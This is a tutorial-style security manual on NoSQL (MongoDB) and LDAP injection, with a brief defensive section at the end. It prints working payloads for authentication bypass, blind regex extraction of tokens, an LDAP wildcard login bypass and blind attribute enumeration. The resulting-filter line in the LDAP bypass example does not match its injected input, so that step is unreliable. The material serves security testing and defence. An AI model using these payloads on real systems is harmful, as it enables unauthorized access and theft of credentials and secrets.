# NoSQL & LDAP Injection Architectural Manual

This manual covers testing and validation techniques for non-relational database query injections (**NoSQL Injection** primarily targeting MongoDB/Mongoose architectures) and directory service authentication flaws (**LDAP Injection**).

---

## 1. NoSQL Injection (MongoDB & Document Stores)

Modern Node.js/Express, Python/Flask, and Go backends using document databases often pass unsanitized JSON bodies or query parameters directly into database queries.

### A. Operator Injection in JSON Bodies
When backends accept `application/json`, replacing string literals with MongoDB query operator objects alters query logic:

```json
// Original Request
{"username": "admin", "password": "user_input"}

// Operator Tampering: Authentication Bypass ($ne = Not Equal)
{"username": "admin", "password": {"$ne": ""}}

// Pattern Matching ($regex / $gt)
{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### B. URL-Encoded Query Parameter Injections
If the backend uses Express `body-parser` or `qs` with extended parsing enabled (`extended: true`), associative arrays can be injected via GET/POST query strings:

```http
POST /api/v1/auth/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=admin&password[$ne]=invalid_pass
```

### C. Boolean Extraction & Data Exfiltration
When error messages are suppressed, extract sensitive fields (e.g., reset tokens, API keys) character-by-character using regex anchors:
```http
POST /api/v1/users/lookup HTTP/1.1
Content-Type: application/json

{"token": {"$regex": "^a"}}
// If 200 OK -> First character is 'a'.
// Repeat sequentially: ^ab, ^ac, ...
```

---

## 2. LDAP Injection (Directory Services & SSO Gateways)

Lightweight Directory Access Protocol (LDAP) is widely used in corporate single sign-on (SSO), VPN gateways, and employee portals. Unsanitized input concatenated into LDAP search filters allows arbitrary query structure manipulation.

### A. Core Filter Syntax & Metacharacters
LDAP uses prefix notation (`(& (attribute=value) (attribute2=value2))`). Critical metacharacters include: `*`, `(`, `)`, `&`, `|`, `!`.

### B. Authentication Bypass via Wildcard Injection
In an authentication query formatted as:
`(&(uid=USER_INPUT)(userPassword=PASSWORD_INPUT))`

Injecting a wildcard into the username field:
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=*)(&(uid=*&password=irrelevant
```
Results in:
`(&(&(uid=*)(userPassword=*)) ... )`
Binding the session to the first user record matching the directory query.

### C. Attribute Enumeration & Blind Extraction
To extract administrative attributes or passwords blindly, manipulate boolean logic and compare response times or status codes:
```ldap
(&(uid=admin)(description=a*))
(&(uid=admin)(description=b*))
```

---

## 3. Defensive Validation
* **For NoSQL:** Use strict schema validation (Mongoose schemas with explicit type constraints) and sanitize query objects using libraries like `mongo-sanitize`.
* **For LDAP:** Use parameterized LDAP search requests (`LdapContext` or parameterized search filters) rather than string concatenation.
